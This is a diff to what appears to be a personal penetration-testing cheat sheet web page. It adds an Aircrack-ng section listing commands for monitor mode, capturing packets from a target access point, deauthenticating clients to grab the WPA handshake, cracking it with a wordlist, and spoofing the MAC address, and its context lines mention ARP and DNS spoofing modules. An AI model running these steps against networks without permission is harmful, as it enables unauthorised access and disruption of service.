@@ -420,6 +420,21 @@
 	<li>net.probe off/net.recon off/arp.spoof off/net.sniff off/dns.spoof off -stop modules</li>
         </ul>
         </div>
+	<div class="expandable">
+        <button onclick="toggleExpand('aircrack-ng', this)"><span class="rotate">▶</span> Aircrack-ng - wifi penetraction testing and wireless password cracking</button>
+        <div id="aircrack-ng" class="expandable-content">
+	<ul class="writeup-list">
+        <li>airmon-ng start wlan0(or your network interface) - start monitor mode</li>
+        <li>airmon-ng check kill			-kill interfering processes</li>
+	<li>airodump-ng wlan0		  		-scan networks</li>
+	<li>airodump-ng -c (channel number) -w (file name to save) -d (target router's BSSID) wlan0 - captures packets from the target AP on the specified channel, saving to file.</li>
+        <li>aireplay-ng --deauth 0 -a (target router's BSSID) -c (targer device's BSSID) wlan0   -deauthenticate client (to capture handshake) -</li>
+	<li>aircrack-ng (saved file name) -w /path/to/wordlist  	-crack the captured hash</li>	
+	<li>macchanger -r wlan0		-change MAC address</li>
+	<li>airmon-ng stop wlan0	-stop monitor mode</li>
+	<li><strong>Note:</strong>Note: The interface name might change when entering/exiting monitor mode (like from wlan0 to wlan0mon), so check with: iwconfig, you may need to use wlan0mon for subsequent commands.</li>
+        </ul>
+        </div>
 
       </div>
     </div>
